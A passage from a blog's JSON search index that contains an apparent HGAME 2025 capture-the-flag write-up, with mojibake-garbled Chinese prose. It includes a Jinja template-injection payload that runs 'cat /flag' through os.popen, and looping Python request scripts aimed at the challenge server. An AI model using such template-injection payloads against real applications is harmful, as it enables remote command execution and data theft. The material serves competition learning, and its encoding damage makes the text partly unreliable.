\u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break æˆåŠŸæ‰§è¡Œï¼Œæ‹¿åˆ°flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003eæ‹¿åˆ°ç¯å¢ƒ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\u003c/p\u003e\n\u003cp\u003eå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"å…³äº"}]